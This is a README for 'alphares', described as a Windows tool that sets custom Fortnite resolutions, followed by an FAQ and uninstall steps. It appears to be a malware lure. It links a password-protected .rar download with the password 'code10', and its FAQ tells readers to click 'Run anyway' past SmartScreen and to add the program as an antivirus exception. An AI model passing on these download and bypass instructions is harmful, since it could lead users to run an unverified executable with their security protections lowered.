<div align="center">
  <h1>alphares is a tool for Windows to save custom settings in Fortnite.</h1>

  [![Downloads](https://img.shields.io/badge/Downloads-1k%2B-blue?style=for-the-badge&logo=download&logoColor=white)](#)
  [![Rating](https://img.shields.io/badge/Rating-5%20Stars-Gold?style=for-the-badge)](#)
</div>

 <p align="center">
    <img src="https://i.imgur.com/kT2cmoy.png" width="500">
  </p>


## Download
* Go to [Download](https://github.com/maxxximgb/alphares/releases/download/Latest/alphares.rar)
* Password: code10


## FAQ

Please **do not** open an issue before reading the FAQ, as I have answered the same question(s) several times in multiple places. If you still have a question or concern after reading the FAQ, then feel free to open an issue. However, you must provide adequate information. What happened? What were you doing? What have you tried to fix the issue?

### Is alphares a virus or a suspicious file?
* No, it is not a virus. All it does is change Fortnite's configuration file and set the file to read-only, so Fortnite cannot change the settings when an update is released - that is it.
* You can view the virus scan from VirusTotal for the [x86](https://www.virustotal.com/gui/file/ee181a4211982d54dcd77f2fdc3626642464fa6cba09c80c620c24dd86d73c31) or [x64](https://www.virustotal.com/gui/file/7c50f9615a0787084ad116f6a018360195dd73effcf2e2399b21a2d6e2dd1c51) release.
* Chrome or Firefox might detect it as suspicious, because when a new version is released, then there is no information about the executable. However, as more people download it, then the warning should disappear. You should still be able to download the file.
* Windows Defender will flag software without a certificate or from unknown sources, so there are often false positives. The solution to this is to purchase a certificate from a Certificate Authority, but this can be expensive for a small developer. Read more [here](https://stackoverflow.com/questions/252226/signing-a-windows-exe-file). As a workaround, I can "self-sign" the executable, however, this will lead to Windows SmartScreen warning you about running the file.
* Windows SmartScreen will state that: "Microsoft Defender SmartScreen prevented an unrecognized app from starting. Running this app might put your PC at risk". However, if you press "More Info", then you will be able to run the program by pressing "Run anyway". I hope as more people download it, then the program will become more trusted and Microsoft will no longer flag it.
* If you are using another anti-virus and alphares is detected as a virus, then you can add alphares as an exception. I do not have time to contact each anti-virus vendor.
* **If you do not feel safe, then please do not download alphares. Alternatively, if you have experience in software, then you can review the code or compile it yourself by running:** `mingw32-make.exe ARCHITECTURE=x86 && alphares.exe` or `mingw64-make.exe ARCHITECTURE=x64 && alphares.exe`.

### How do I use alphares?
* Open the "alphares" executable
* Change the `Width` and `Height` to a desired resolution
* Click on "Read-only" so the box is checked
* Press "Apply"
* You *might* also have to change the settings in the NVIDIA or AMD Control Panel

### I can't do `xyz` in Fortnite after changing my resolution. Why?
It is possible that after changing Fortnite's resolution, you may experience issues such as:

1. The inability to open a menu, go to settings, click a button or access inventory
2. Black vertical bar(s) in Fortnite
3. The inability to minimize (<kbd>Alt</kbd> + <kbd>Tab</kbd>) Fortnite

Most of these issues can be fixed by changing the settings in the NVIDIA or AMD Control Panel. Sometimes you must change the monitor's resolution to match Fortnite's resolution. However, if you choose to do this, then please do so at your own risk. There are several resources on the internet on how to do this. Other than that, most of these issues are not within my power to fix.

### How do I uninstall alphares?
There is nothing to uninstall.

If you want to delete alphares, then just delete or move `alphares.exe` to the Recycle Bin.

If you want to "undo" the changes made from using alphares, then you must:

1. Close Fortnite.
2. Press `Win + R` to open a "Run" window.
3. In the "Run" box, type: `%localappdata%` and press Enter.
4. From there, you will have to navigate to: `FortniteGame/Saved/Config/WindowsClient/GameUserSettings.ini`.
5. Right-click on `GameUserSettings.ini`, then select "Properties".
6. A dialog box will open where you can uncheck the "Read-only" box, and then press "Apply".
7. Open Fortnite.

This should allow Fortnite to overwrite the settings that were saved from alphares. However, if that does not work, then you will have to delete the `GameUserSettings.ini` file. Please keep in mind that this will reset all settings.

1. Close Fortnite.
2. Press `Win + R` to open a "Run" window.
3. In the "Run" box, type: `%localappdata%` and press Enter.
4. From there, you will have to navigate to: `FortniteGame/Saved/Config/WindowsClient/GameUserSettings.ini`.
5. Delete `GameUserSettings.ini`.
6. Open Fortnite.

### Why is alphares not changing Fortnite's resolution?
The truth is I am not sure. Here are some fixes that have helped others:

1. Close Fortnite, delete `GameUserSettings.ini`, re-open Fortnite to generate a new settings file, close Fortnite and then use alphares.
2. Run alphares as an administrator.
3. Uninstall and reinstall Fortnite.

### Why does alphares say there is no configuration file?
1. Press `Win + R` to open a "Run" window.
2. In the "Run" box, type: `%localappdata%` and press Enter.
3. From there, you will have to navigate to: `FortniteGame/Saved/Config/WindowsClient/GameUserSettings.ini`.
4. If the `GameUserSettings.ini` file does exist, then close Fortnite and attempt to delete the file. However, please note that this will reset the game's settings.
* Note: You should have launched Fortnite at least once, and allowed the game to detect the best settings or saved custom settings in-game before running alphares.
* If you are still having issues, please open an issue and tell me where Fortnite is installed and if the `GameUserSettings.ini` is missing or not.

### What are popular resolution(s)?
* 1600x1080
* 1440x1080
* 1280x1024
* 1154x1080
* 1080x1080
